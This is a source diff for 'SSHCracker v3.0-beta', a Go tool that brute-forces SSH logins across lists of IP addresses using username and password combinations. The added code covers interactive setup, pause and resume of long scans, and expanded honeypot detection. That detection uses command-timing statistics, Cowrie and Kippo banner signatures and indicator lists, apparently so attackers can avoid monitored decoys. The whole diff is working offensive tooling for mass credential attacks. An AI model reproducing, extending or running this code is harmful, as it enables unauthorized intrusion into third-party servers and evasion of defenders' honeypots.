@@ -2,19 +2,26 @@ package main
 
 import (
 	"bufio"
+	"context"
+	"encoding/json"
+	"errors"
 	"fmt"
 	"log"
 	"math"
 	"os"
 	"os/exec"
+	"os/signal"
 	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 
+	"github.com/manifoldco/promptui"
+	"github.com/spf13/pflag"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -25,12 +32,59 @@ var ipFile string
 var timeout int
 var maxConnections int
 
-const VERSION = "2.6"
+const VERSION = "3.0-beta"
+
+// Pause/Resume state
+var (
+	isPaused         int32 = 0
+	currentTaskIndex int64 = 0
+	scanConfig       *ScanConfig
+	usernameFile     string
+	passwordFile     string
+)
 
 var (
 	successfulIPs = make(map[string]struct{})
 	mapMutex      sync.Mutex
 )
+
+// ScanConfig holds all user-configurable options
+type ScanConfig struct {
+	UsernameFile string
+	PasswordFile string
+	IPFile       string
+	Timeout      int
+	MaxWorkers   int
+	ResumeFile   string
+}
+
+// ScanState represents the complete state of a paused scan
+type ScanState struct {
+	Version    string    `json:"version"`
+	StartTime  time.Time `json:"start_time"`
+	PausedTime time.Time `json:"paused_time"`
+	TaskIndex  int64     `json:"task_index"`
+	TotalTasks int64     `json:"total_tasks"`
+	Stats      struct {
+		Goods     int64 `json:"goods"`
+		Errors    int64 `json:"errors"`
+		Honeypots int64 `json:"honeypots"`
+	} `json:"stats"`
+	Config struct {
+		UsernameFile string `json:"username_file"`
+		PasswordFile string `json:"password_file"`
+		IPFile       string `json:"ip_file"`
+		Timeout      int    `json:"timeout"`
+		MaxWorkers   int    `json:"max_workers"`
+	} `json:"config"`
+	SuccessfulIPs []string `json:"successful_ips,omitempty"`
+}
+
+// Default configuration values
+var DefaultConfig = ScanConfig{
+	Timeout:    10,
+	MaxWorkers: 100,
+}
 
 // Enhanced task structure for better performance
 type SSHTask struct {
@@ -63,27 +117,72 @@ type ServerInfo struct {
 
 // Honeypot detection structure
 type HoneypotDetector struct {
-	SuspiciousPatterns []string
-	TimeAnalysis       bool
-	CommandAnalysis    bool
-	NetworkAnalysis    bool
+	TimeAnalysis    bool
+	CommandAnalysis bool
+	NetworkAnalysis bool
 }
 
 func main() {
-	reader := bufio.NewReader(os.Stdin)
+	// Parse CLI flags
+	resumeFlag := pflag.BoolP("resume", "r", false, "Resume from paused.json")
+	resumeFile := pflag.String("resume-file", "paused.json", "Path to resume state file")
+	helpFlag := pflag.BoolP("help", "h", false, "Show help message")
+	pflag.Parse()
 
-	createComboFile(reader)
-	fmt.Print("Enter the IP list file path: ")
-	ipFile, _ = reader.ReadString('\n')
-	ipFile = strings.TrimSpace(ipFile)
+	if *helpFlag {
+		printHelp()
+		return
+	}
 
-	fmt.Print("Enter the timeout value (seconds): ")
-	timeoutStr, _ := reader.ReadString('\n')
-	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))
+	// Setup signal handler for graceful pause
+	setupSignalHandler()
 
-	fmt.Print("Enter the maximum number of workers: ")
-	maxConnectionsStr, _ := reader.ReadString('\n')
-	maxConnections, _ = strconv.Atoi(strings.TrimSpace(maxConnectionsStr))
+	// Start auto-save goroutine
+	go autoSaveState()
+
+	var config *ScanConfig
+	var err error
+
+	// Check for resume mode
+	if *resumeFlag {
+		state, err := loadState(*resumeFile)
+		if err != nil {
+			log.Fatalf("❌ Failed to load resume state: %v", err)
+		}
+		resumeFromState(state)
+		return
+	}
+
+	// Interactive input mode
+	config, err = collectUserInput()
+	if err != nil {
+		if err == promptui.ErrInterrupt {
+			fmt.Println("\n👋 Cancelled by user")
+			return
+		}
+		log.Fatalf("❌ Input error: %v", err)
+	}
+
+	// Check if user chose to resume
+	if config.ResumeFile != "" {
+		state, err := loadState(config.ResumeFile)
+		if err != nil {
+			log.Fatalf("❌ Failed to load resume state: %v", err)
+		}
+		resumeFromState(state)
+		return
+	}
+
+	// Store config globally
+	scanConfig = config
+	usernameFile = config.UsernameFile
+	passwordFile = config.PasswordFile
+	ipFile = config.IPFile
+	timeout = config.Timeout
+	maxConnections = config.MaxWorkers
+
+	// Create combo file
+	createComboFileFromConfig(config)
 
 	startTime = time.Now()
 
@@ -91,11 +190,439 @@ func main() {
 	ips := getItems(ipFile)
 	totalIPCount = len(ips) * len(combos)
 
-	// Enhanced worker pool system
-	setupEnhancedWorkerPool(combos, ips)
+	// Show scan summary and get confirmation
+	if !showScanSummary(config, len(ips), len(combos)) {
+		fmt.Println("\n👋 Scan cancelled by user")
+		return
+	}
 
-	banner()
-	fmt.Println("Operation completed successfully!")
+	// Enhanced worker pool system with pause support
+	setupEnhancedWorkerPoolWithResume(combos, ips, 0)
+
+	// Clean up state files on successful completion
+	cleanupStateFiles()
+
+	fmt.Println("\n✅ Operation completed successfully!")
+}
+
+// Print help message
+func printHelp() {
+	const boxWidth = 62
+	
+	fmt.Println()
+	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
+	printBoxLine(fmt.Sprintf("🚀 SSHCracker v%s - Help 🚀", VERSION), boxWidth)
+	fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+	printBoxLine("", boxWidth)
+	printBoxLine("USAGE:", boxWidth)
+	printBoxLine("  ./sshcracker [OPTIONS]", boxWidth)
+	printBoxLine("", boxWidth)
+	printBoxLine("OPTIONS:", boxWidth)
+	printBoxLine("  -r, --resume         Resume from paused.json", boxWidth)
+	printBoxLine("  --resume-file PATH   Resume from custom state file", boxWidth)
+	printBoxLine("  -h, --help           Show this help message", boxWidth)
+	printBoxLine("", boxWidth)
+	printBoxLine("EXAMPLES:", boxWidth)
+	printBoxLine("  ./sshcracker                  # Interactive mode", boxWidth)
+	printBoxLine("  ./sshcracker -r               # Resume previous scan", boxWidth)
+	printBoxLine("  ./sshcracker --resume-file myscan.json", boxWidth)
+	printBoxLine("", boxWidth)
+	printBoxLine("FEATURES:", boxWidth)
+	printBoxLine("  • Advanced Honeypot Detection (10+ algorithms)", boxWidth)
+	printBoxLine("  • Pause/Resume with Ctrl+C", boxWidth)
+	printBoxLine("  • Auto-save every 5 minutes", boxWidth)
+	printBoxLine("  • Professional input validation", boxWidth)
+	printBoxLine("  • Dynamic threshold calculation", boxWidth)
+	printBoxLine("", boxWidth)
+	printBoxLine("DEVELOPER: SudoLite", boxWidth)
+	printBoxLine("GitHub: github.com/sudolite", boxWidth)
+	printBoxLine("Twitter: @sudolite", boxWidth)
+	printBoxLine("", boxWidth)
+	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
+}
+
+// Validate file path exists
+func validateFilePath(input string) error {
+	input = strings.TrimSpace(input)
+	if input == "" {
+		return errors.New("file path cannot be empty")
+	}
+	if _, err := os.Stat(input); os.IsNotExist(err) {
+		return fmt.Errorf("file does not exist: %s", input)
+	}
+	return nil
+}
+
+// Validate integer in range
+func validateIntRange(min, max int) promptui.ValidateFunc {
+	return func(input string) error {
+		val, err := strconv.Atoi(strings.TrimSpace(input))
+		if err != nil {
+			return errors.New("must be a valid number")
+		}
+		if val < min || val > max {
+			return fmt.Errorf("value must be between %d and %d", min, max)
+		}
+		return nil
+	}
+}
+
+// Collect user input with promptui
+func collectUserInput() (*ScanConfig, error) {
+	config := &ScanConfig{}
+	const boxWidth = 62
+
+	fmt.Println()
+	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
+	printBoxLine(fmt.Sprintf("🚀 SSHCracker v%s - Setup 🚀", VERSION), boxWidth)
+	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
+	fmt.Println()
+
+	// Check for existing paused scan
+	if _, err := os.Stat("paused.json"); err == nil {
+		resumePrompt := promptui.Select{
+			Label: "📂 Found paused scan. What would you like to do?",
+			Items: []string{"🔄 Resume previous scan", "🆕 Start new scan"},
+		}
+		idx, _, err := resumePrompt.Run()
+		if err != nil {
+			return nil, err
+		}
+		if idx == 0 {
+			config.ResumeFile = "paused.json"
+			return config, nil
+		}
+		fmt.Println()
+	}
+
+	// Username file
+	usernamePrompt := promptui.Prompt{
+		Label:    "📁 Username list file path",
+		Validate: validateFilePath,
+		Templates: &promptui.PromptTemplates{
+			Prompt:  "{{ . | cyan | bold }}: ",
+			Valid:   "{{ . | green | bold }}: ",
+			Invalid: "{{ . | red | bold }}: ",
+			Success: "{{ . | bold }}: ",
+		},
+	}
+	var err error
+	config.UsernameFile, err = usernamePrompt.Run()
+	if err != nil {
+		return nil, err
+	}
+
+	// Password file
+	passwordPrompt := promptui.Prompt{
+		Label:    "🔐 Password list file path",
+		Validate: validateFilePath,
+		Templates: &promptui.PromptTemplates{
+			Prompt:  "{{ . | cyan | bold }}: ",
+			Valid:   "{{ . | green | bold }}: ",
+			Invalid: "{{ . | red | bold }}: ",
+			Success: "{{ . | bold }}: ",
+		},
+	}
+	config.PasswordFile, err = passwordPrompt.Run()
+	if err != nil {
+		return nil, err
+	}
+
+	// IP file
+	ipPrompt := promptui.Prompt{
+		Label:    "🌐 IP list file path (ip:port format)",
+		Validate: validateFilePath,
+		Templates: &promptui.PromptTemplates{
+			Prompt:  "{{ . | cyan | bold }}: ",
+			Valid:   "{{ . | green | bold }}: ",
+			Invalid: "{{ . | red | bold }}: ",
+			Success: "{{ . | bold }}: ",
+		},
+	}
+	config.IPFile, err = ipPrompt.Run()
+	if err != nil {
+		return nil, err
+	}
+
+	// Timeout
+	timeoutPrompt := promptui.Prompt{
+		Label:    "⏱️  Timeout in seconds",
+		Default:  strconv.Itoa(DefaultConfig.Timeout),
+		Validate: validateIntRange(1, 300),
+		Templates: &promptui.PromptTemplates{
+			Prompt:  "{{ . | cyan | bold }}: ",
+			Valid:   "{{ . | green | bold }}: ",
+			Invalid: "{{ . | red | bold }}: ",
+			Success: "{{ . | bold }}: ",
+		},
+	}
+	timeoutStr, err := timeoutPrompt.Run()
+	if err != nil {
+		return nil, err
+	}
+	config.Timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))
+
+	// Workers
+	workersPrompt := promptui.Prompt{
+		Label:    "👷 Maximum workers",
+		Default:  strconv.Itoa(DefaultConfig.MaxWorkers),
+		Validate: validateIntRange(1, 1000),
+		Templates: &promptui.PromptTemplates{
+			Prompt:  "{{ . | cyan | bold }}: ",
+			Valid:   "{{ . | green | bold }}: ",
+			Invalid: "{{ . | red | bold }}: ",
+			Success: "{{ . | bold }}: ",
+		},
+	}
+	workersStr, err := workersPrompt.Run()
+	if err != nil {
+		return nil, err
+	}
+	config.MaxWorkers, _ = strconv.Atoi(strings.TrimSpace(workersStr))
+
+	return config, nil
+}
+
+// Show scan summary and get confirmation
+func showScanSummary(config *ScanConfig, ipCount, comboCount int) bool {
+	totalCombinations := ipCount * comboCount
+	estimatedSpeed := float64(config.MaxWorkers * CONCURRENT_PER_WORKER) * 0.5 // Conservative estimate
+	estimatedDuration := float64(totalCombinations) / estimatedSpeed
+
+	const boxWidth = 62
+
+	fmt.Println()
+	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
+	printBoxLine("📋 SCAN CONFIGURATION", boxWidth)
+	fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+	printBoxLine(fmt.Sprintf("🌐 Targets:        %s IPs", formatNumber(ipCount)), boxWidth)
+	printBoxLine(fmt.Sprintf("🔑 Combinations:   %s", formatNumber(totalCombinations)), boxWidth)
+	printBoxLine(fmt.Sprintf("⏱️  Timeout:        %ds", config.Timeout), boxWidth)
+	printBoxLine(fmt.Sprintf("👷 Workers:        %s", formatNumber(config.MaxWorkers)), boxWidth)
+	printBoxLine(fmt.Sprintf("⚡ Est. Speed:     ~%.0f checks/sec", estimatedSpeed), boxWidth)
+	printBoxLine(fmt.Sprintf("⏳ Est. Duration:  %s", formatDuration(estimatedDuration)), boxWidth)
+	fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+	printBoxLine("💡 Press Ctrl+C during scan to pause and save progress", boxWidth)
+	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
+	fmt.Println()
+
+	confirmPrompt := promptui.Select{
+		Label: "🚀 Start scan?",
+		Items: []string{"✅ Yes, start scan", "❌ No, cancel"},
+	}
+	idx, _, err := confirmPrompt.Run()
+	if err != nil || idx != 0 {
+		return false
+	}
+	fmt.Println()
+	return true
+}
+
+// Format number with commas
+func formatNumber(n int) string {
+	str := strconv.Itoa(n)
+	if len(str) <= 3 {
+		return str
+	}
+	
+	var result []byte
+	for i, c := range str {
+		if i > 0 && (len(str)-i)%3 == 0 {
+			result = append(result, ',')
+		}
+		result = append(result, byte(c))
+	}
+	return string(result)
+}
+
+// Format duration in human readable format
+func formatDuration(seconds float64) string {
+	if seconds < 60 {
+		return fmt.Sprintf("%.0f seconds", seconds)
+	} else if seconds < 3600 {
+		return fmt.Sprintf("~%.0f minutes", seconds/60)
+	} else if seconds < 86400 {
+		return fmt.Sprintf("~%.1f hours", seconds/3600)
+	}
+	return fmt.Sprintf("~%.1f days", seconds/86400)
+}
+
+// Setup signal handler for graceful pause
+func setupSignalHandler() {
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	go func() {
+		<-sigChan
+		fmt.Fprintf(os.Stderr, "\n\n⏸️  Pausing scan... Please wait...\n")
+		atomic.StoreInt32(&isPaused, 1)
+
+		// Wait for workers to finish current tasks
+		time.Sleep(2 * time.Second)
+
+		// Save state
+		if err := saveState("paused.json"); err != nil {
+			log.Printf("❌ Failed to save state: %v", err)
+		} else {
+			fmt.Fprintf(os.Stderr, "✅ State saved to paused.json\n")
+			fmt.Fprintf(os.Stderr, "📂 Resume with: ./sshcracker --resume\n")
+		}
+		os.Exit(0)
+	}()
+}
+
+// Check if paused
+func IsPaused() bool {
+	return atomic.LoadInt32(&isPaused) == 1
+}
+
+// Auto-save state every 5 minutes
+func autoSaveState() {
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		if atomic.LoadInt64(&currentTaskIndex) > 0 && !IsPaused() {
+			if err := saveState("autosave.json"); err != nil {
+				log.Printf("⚠️ Auto-save failed: %v", err)
+			}
+		}
+	}
+}
+
+// Save current state to file
+func saveState(filename string) error {
+	state := ScanState{
+		Version:    VERSION,
+		StartTime:  startTime,
+		PausedTime: time.Now(),
+		TaskIndex:  atomic.LoadInt64(&currentTaskIndex),
+		TotalTasks: int64(totalIPCount),
+	}
+
+	state.Stats.Goods = atomic.LoadInt64(&stats.goods)
+	state.Stats.Errors = atomic.LoadInt64(&stats.errors)
+	state.Stats.Honeypots = atomic.LoadInt64(&stats.honeypots)
+
+	if scanConfig != nil {
+		state.Config.UsernameFile = usernameFile
+		state.Config.PasswordFile = passwordFile
+		state.Config.IPFile = ipFile
+		state.Config.Timeout = timeout
+		state.Config.MaxWorkers = maxConnections
+	}
+
+	mapMutex.Lock()
+	for ip := range successfulIPs {
+		state.SuccessfulIPs = append(state.SuccessfulIPs, ip)
+	}
+	mapMutex.Unlock()
+
+	data, err := json.MarshalIndent(state, "", "  ")
+	if err != nil {
+		return err
+	}
+
+	return os.WriteFile(filename, data, 0644)
+}
+
+// Load state from file
+func loadState(filename string) (*ScanState, error) {
+	data, err := os.ReadFile(filename)
+	if err != nil {
+		return nil, err
+	}
+
+	var state ScanState
+	if err := json.Unmarshal(data, &state); err != nil {
+		return nil, err
+	}
+
+	return &state, nil
+}
+
+// Resume from saved state
+func resumeFromState(state *ScanState) {
+	const boxWidth = 62
+	
+	fmt.Println()
+	fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
+	printBoxLine("🔄 RESUMING SCAN", boxWidth)
+	fmt.Println("╚" + strings.Repeat("═", boxWidth) + "╝")
+
+	// Restore globals
+	startTime = state.StartTime
+	ipFile = state.Config.IPFile
+	usernameFile = state.Config.UsernameFile
+	passwordFile = state.Config.PasswordFile
+	timeout = state.Config.Timeout
+	maxConnections = state.Config.MaxWorkers
+
+	// Restore stats
+	atomic.StoreInt64(&stats.goods, state.Stats.Goods)
+	atomic.StoreInt64(&stats.errors, state.Stats.Errors)
+	atomic.StoreInt64(&stats.honeypots, state.Stats.Honeypots)
+
+	// Restore successful IPs map
+	mapMutex.Lock()
+	for _, ip := range state.SuccessfulIPs {
+		successfulIPs[ip] = struct{}{}
+	}
+	mapMutex.Unlock()
+
+	progress := float64(state.TaskIndex) / float64(state.TotalTasks) * 100
+	fmt.Printf("\n📂 Resuming from task %d/%d (%.1f%% complete)\n",
+		state.TaskIndex, state.TotalTasks, progress)
+	fmt.Printf("📊 Previous stats: ✅ %d goods | ❌ %d errors | 🍯 %d honeypots\n\n",
+		state.Stats.Goods, state.Stats.Errors, state.Stats.Honeypots)
+
+	// Recreate combo file
+	createComboFileFromPaths(state.Config.UsernameFile, state.Config.PasswordFile)
+
+	combos := getItems("combo.txt")
+	ips := getItems(state.Config.IPFile)
+	totalIPCount = len(ips) * len(combos)
+
+	// Setup signal handler
+	setupSignalHandler()
+	go autoSaveState()
+
+	// Resume from saved index
+	setupEnhancedWorkerPoolWithResume(combos, ips, state.TaskIndex)
+
+	// Clean up state files on successful completion
+	cleanupStateFiles()
+
+	fmt.Println("\n✅ Operation completed successfully!")
+}
+
+// Clean up state files after successful completion
+func cleanupStateFiles() {
+	os.Remove("paused.json")
+	os.Remove("autosave.json")
+}
+
+// Create combo file from config
+func createComboFileFromConfig(config *ScanConfig) {
+	createComboFileFromPaths(config.UsernameFile, config.PasswordFile)
+}
+
+// Create combo file from paths
+func createComboFileFromPaths(usernamePath, passwordPath string) {
+	usernames := getItems(usernamePath)
+	passwords := getItems(passwordPath)
+
+	file, err := os.Create("combo.txt")
+	if err != nil {
+		log.Fatalf("Failed to create combo file: %s", err)
+	}
+	defer file.Close()
+
+	for _, username := range usernames {
+		for _, password := range passwords {
+			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
+		}
+	}
 }
 
 func getItems(path string) [][]string {
@@ -128,27 +655,15 @@ func clear() {
 }
 
 func createComboFile(reader *bufio.Reader) {
+	// Legacy function - kept for compatibility
 	fmt.Print("Enter the username list file path: ")
-	usernameFile, _ := reader.ReadString('\n')
-	usernameFile = strings.TrimSpace(usernameFile)
+	usernameFilePath, _ := reader.ReadString('\n')
+	usernameFilePath = strings.TrimSpace(usernameFilePath)
 	fmt.Print("Enter the password list file path: ")
-	passwordFile, _ := reader.ReadString('\n')
-	passwordFile = strings.TrimSpace(passwordFile)
+	passwordFilePath, _ := reader.ReadString('\n')
+	passwordFilePath = strings.TrimSpace(passwordFilePath)
 
-	usernames := getItems(usernameFile)
-	passwords := getItems(passwordFile)
-
-	file, err := os.Create("combo.txt")
-	if err != nil {
-		log.Fatalf("Failed to create combo file: %s", err)
-	}
-	defer file.Close()
-
-	for _, username := range usernames {
-		for _, password := range passwords {
-			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
-		}
-	}
+	createComboFileFromPaths(usernameFilePath, passwordFilePath)
 }
 
 // Gather system information
@@ -236,50 +751,220 @@ func contains(slice []string, item string) bool {
 	return false
 }
 
-// Advanced honeypot detection algorithm (BETA)
+// Advanced honeypot detection algorithm v3.0
 func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
+	// Create context with 30 second timeout for all honeypot tests
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
 	honeypotScore := 0
-	
+	testsRun := 0
+	testsSuccessful := 0
+
+	// Channel to collect scores with timeout protection
+	type testResult struct {
+		score   int
+		success bool
+	}
+
+	runTest := func(testFunc func() int) int {
+		done := make(chan testResult, 1)
+		go func() {
+			score := testFunc()
+			done <- testResult{score: score, success: true}
+		}()
+
+		select {
+		case result := <-done:
+			testsRun++
+			if result.success {
+				testsSuccessful++
+			}
+			return result.score
+		case <-ctx.Done():
+			return 0
+		case <-time.After(5 * time.Second):
+			return 0
+		}
+	}
+
 	// 1. Analyze suspicious patterns in command output
-	honeypotScore += analyzeCommandOutput(serverInfo)
-	
+	honeypotScore += runTest(func() int { return analyzeCommandOutput(serverInfo) })
+
 	// 2. Analyze response time
 	if detector.TimeAnalysis {
-		honeypotScore += analyzeResponseTime(serverInfo)
+		honeypotScore += runTest(func() int { return analyzeResponseTime(serverInfo) })
 	}
-	
+
 	// 3. Analyze file and directory structure
-	honeypotScore += analyzeFileSystem(serverInfo)
-	
+	honeypotScore += runTest(func() int { return analyzeFileSystem(serverInfo) })
+
 	// 4. Analyze running processes
-	honeypotScore += analyzeProcesses(serverInfo)
-	
+	honeypotScore += runTest(func() int { return analyzeProcesses(serverInfo) })
+
 	// 5. Analyze network and ports
 	if detector.NetworkAnalysis {
-		honeypotScore += analyzeNetwork(client)
+		honeypotScore += runTest(func() int { return analyzeNetwork(client) })
 	}
-	
+
 	// 6. Behavioral tests
-	honeypotScore += behavioralTests(client, serverInfo)
-	
+	honeypotScore += runTest(func() int { return behavioralTests(client, serverInfo) })
+
 	// 7. Detect abnormal patterns
-	honeypotScore += detectAnomalies(serverInfo)
-	
+	honeypotScore += runTest(func() int { return detectAnomalies(serverInfo) })
+
 	// 8. Advanced tests
-	honeypotScore += advancedHoneypotTests(client)
-	
+	honeypotScore += runTest(func() int { return advancedHoneypotTests(client) })
+
 	// 9. Performance tests
-	honeypotScore += performanceTests(client)
-	
+	honeypotScore += runTest(func() int { return performanceTests(client) })
+
+	// 10. NEW: Command timing analysis (v3.0)
+	honeypotScore += runTest(func() int { return analyzeCommandTiming(client) })
+
+	// 11. NEW: SSH Banner analysis (v3.0)
+	honeypotScore += runTest(func() int { return analyzeSSHBanner(serverInfo) })
+
 	// Record score
 	serverInfo.HoneypotScore = honeypotScore
-	
-	// Honeypot detection threshold: score 6 or higher
-	// This threshold provides good balance between false positives and false negatives
-	// - Score 1-3: Low probability (legitimate servers with some restrictions)
-	// - Score 4-5: Medium probability (possibly limited environments)
-	// - Score 6+: High probability (likely honeypot)
-	return honeypotScore >= 6
+
+	// Calculate dynamic threshold based on successful tests
+	threshold := calculateDynamicThreshold(testsRun, testsSuccessful)
+
+	return honeypotScore >= threshold
+}
+
+// Calculate dynamic threshold based on test execution results
+// This ensures fair scoring when some tests fail or timeout
+func calculateDynamicThreshold(testsRun, testsSuccessful int) int {
+	// If very few tests ran successfully, be more conservative
+	if testsSuccessful < 4 {
+		return 4 // Lower threshold due to limited data
+	}
+
+	// Calculate maximum possible score based on successful tests
+	// Each test averages about 1.5 points when detecting a honeypot
+	maxPossibleScore := float64(testsSuccessful) * 1.5
+
+	// Threshold = 30% of maximum possible score
+	// This balances between false positives and false negatives
+	threshold := int(maxPossibleScore * 0.30)
+
+	// Clamp threshold between 5 and 8
+	if threshold < 5 {
+		threshold = 5
+	}
+	if threshold > 8 {
+		threshold = 8
+	}
+
+	return threshold
+}
+
+// Analyze command execution timing for honeypot detection
+// Honeypots often have very consistent/fast response times with low variance
+func analyzeCommandTiming(client *ssh.Client) int {
+	testCommands := []string{
+		"id",
+		"pwd",
+		"whoami",
+		"ls /",
+		"cat /etc/hostname",
+	}
+
+	var timings []float64
+	successCount := 0
+
+	for _, cmd := range testCommands {
+		start := time.Now()
+		output := executeCommand(client, cmd)
+		elapsed := time.Since(start).Seconds() * 1000 // Convert to milliseconds
+
+		// Only count successful executions
+		if !strings.Contains(output, "ERROR") && len(output) > 0 {
+			timings = append(timings, elapsed)
+			successCount++
+		}
+	}
+
+	// Need at least 3 successful commands for valid analysis
+	if successCount < 3 {
+		return 0
+	}
+
+	// Calculate mean
+	var sum float64
+	for _, t := range timings {
+		sum += t
+	}
+	mean := sum / float64(len(timings))
+
+	// Calculate standard deviation
+	var varianceSum float64
+	for _, t := range timings {
+		diff := t - mean
+		varianceSum += diff * diff
+	}
+	stdDev := math.Sqrt(varianceSum / float64(len(timings)))
+
+	// Calculate Coefficient of Variation (CV = stdDev / mean)
+	// Low CV indicates very consistent timing (suspicious for honeypot)
+	cv := stdDev / mean
+
+	score := 0
+
+	// Very low variance with fast response = highly suspicious
+	// Real servers have variable load causing timing differences
+	if cv < 0.05 && mean < 10 {
+		// CV < 5% and mean < 10ms = very suspicious
+		score = 2
+	} else if cv < 0.08 && mean < 15 {
+		// CV < 8% and mean < 15ms = somewhat suspicious
+		score = 1
+	}
+
+	return score
+}
+
+// Analyze SSH banner for known honeypot signatures
+func analyzeSSHBanner(serverInfo *ServerInfo) int {
+	score := 0
+
+	sshVersion := strings.ToLower(serverInfo.SSHVersion)
+
+	// Known honeypot SSH banners and versions
+	honeypotBanners := []string{
+		"ssh-2.0-openssh_6.0p1 debian-4",    // Cowrie default
+		"ssh-2.0-libssh_0.6.0",               // Kippo
+		"ssh-2.0-openssh_5.1p1 debian-5",    // Old Kippo
+		"ssh-2.0-openssh_5.9p1",              // Common honeypot version
+		"ssh-2.0-openssh_6.6.1",              // Another honeypot version
+		"cowrie",
+		"kippo",
+		"honssh",
+	}
+
+	for _, banner := range honeypotBanners {
+		if strings.Contains(sshVersion, banner) {
+			score += 3
+			break // Only count once
+		}
+	}
+
+	// Check for suspiciously old or uncommon SSH versions
+	oldVersions := []string{
+		"openssh_4.", "openssh_5.0", "openssh_5.1", "openssh_5.2",
+		"dropbear_0.", "dropbear_2012", "dropbear_2013",
+	}
+
+	for _, oldVer := range oldVersions {
+		if strings.Contains(sshVersion, oldVer) {
+			score += 1
+			break
+		}
+	}
+
+	return score
 }
 
 // Analyze command output for suspicious patterns
@@ -289,11 +974,19 @@ func analyzeCommandOutput(serverInfo *ServerInfo) int {
 	for _, output := range serverInfo.Commands {
 		lowerOutput := strings.ToLower(output)
 		
-		// Check specific honeypot patterns
+		// Check specific honeypot patterns - Extended list for v3.0
 		honeypotIndicators := []string{
+			// General honeypot terms
 			"fake", "simulation", "honeypot", "trap", "monitor",
+			// Known honeypot software
 			"cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
-			"/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
+			"dionaea", "elastichoney", "honssh", "bifrozt", "kojoney", "ssh-honeypotd",
+			"conpot", "glastopf", "amun", "nepenthes",
+			// Honeypot file paths
+			"/opt/honeypot", "/var/log/honeypot", "/var/lib/cowrie", "/home/cowrie",
+			"cowrie.log", "kippo.log", "/opt/cowrie", "/opt/kippo",
+			// Suspicious patterns
+			"/usr/share/cowrie", "twisted.conch",
 		}
 		
 		for _, indicator := range honeypotIndicators {
@@ -556,9 +1249,11 @@ func detectAnomalies(serverInfo *ServerInfo) int {
 	
 	// Check hostname
 	if hostname := serverInfo.Hostname; hostname != "" {
+		// Only check for truly suspicious hostnames
+		// Removed "GNU/Linux" and "PREEMPT_DYNAMIC" - these are common in real systems
 		suspiciousHostnames := []string{
-			"honeypot", "fake", "trap", "monitor", "sandbox",
-			"test", "simulation", "GNU/Linux", "PREEMPT_DYNAMIC", // Very generic names
+			"honeypot", "fake", "trap", "sandbox",
+			"simulation", "decoy", "honey",
 		}
 		
 		lowerHostname := strings.ToLower(hostname)
@@ -636,7 +1331,14 @@ func banner() {
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
 
+	const boxWidth = 62 // Inner width (excluding borders)
+
 	for range ticker.C {
+		// Check if paused
+		if IsPaused() {
+			return
+		}
+
 		// Use atomic operations for thread-safe reading
 		goods := atomic.LoadInt64(&stats.goods)
 		errors := atomic.LoadInt64(&stats.errors)
@@ -644,52 +1346,136 @@ func banner() {
 		
 		totalConnections := int(goods + errors + honeypots)
 		elapsedTime := time.Since(startTime).Seconds()
-		connectionsPerSecond := float64(totalConnections) / elapsedTime
-		estimatedRemainingTime := float64(totalIPCount-totalConnections) / connectionsPerSecond
+		
+		// Avoid division by zero
+		var connectionsPerSecond float64
+		var estimatedRemainingTime float64
+		if elapsedTime > 0 && totalConnections > 0 {
+			connectionsPerSecond = float64(totalConnections) / elapsedTime
+			estimatedRemainingTime = float64(totalIPCount-totalConnections) / connectionsPerSecond
+			if estimatedRemainingTime < 0 {
+				estimatedRemainingTime = 0
+			}
+		}
 
 		clear()
 
-		fmt.Printf("================================================\n")
-		fmt.Printf("🚀 Advanced SSH Brute Force Tool v%s 🚀\n", VERSION)
-		fmt.Printf("================================================\n")
-		fmt.Printf("📁 File: %s | ⏱️  Timeout: %ds\n", ipFile, timeout)
-		fmt.Printf("🔗 Max Workers: %d | 🎯 Per Worker: %d\n", maxConnections, CONCURRENT_PER_WORKER)
-		fmt.Printf("================================================\n")
-		fmt.Printf("🔍 Checked SSH: %d/%d\n", totalConnections, totalIPCount)
-		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
+		// Top border
+		fmt.Println("╔" + strings.Repeat("═", boxWidth) + "╗")
+		
+		// Title
+		printBoxLine(fmt.Sprintf("🚀 SSHCracker v%s - Advanced SSH Brute Force 🚀", VERSION), boxWidth)
+		
+		// Separator
+		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+		
+		// File info
+		printBoxLine(fmt.Sprintf("📁 File: %s", truncateString(ipFile, 50)), boxWidth)
+		printBoxLine(fmt.Sprintf("⏱️ Timeout: %ds | 👷 Workers: %d | 🎯 Per Worker: %d", timeout, maxConnections, CONCURRENT_PER_WORKER), boxWidth)
+		
+		// Separator
+		fmt.Println("╠" + strings.Repeat("═", boxWidth) + "╣")
+		
+		// Progress
+		progressPct := float64(totalConnections) / float64(totalIPCount) * 100
+		printBoxLine(fmt.Sprintf("🔍 Progress: %8d / %8d (%5.1f%%)", totalConnections, totalIPCount, progressPct), boxWidth)
+		printBoxLine(fmt.Sprintf("⚡ Speed: %.1f checks/sec", connectionsPerSecond), boxWidth)
 		
 		if totalConnections < totalIPCount {
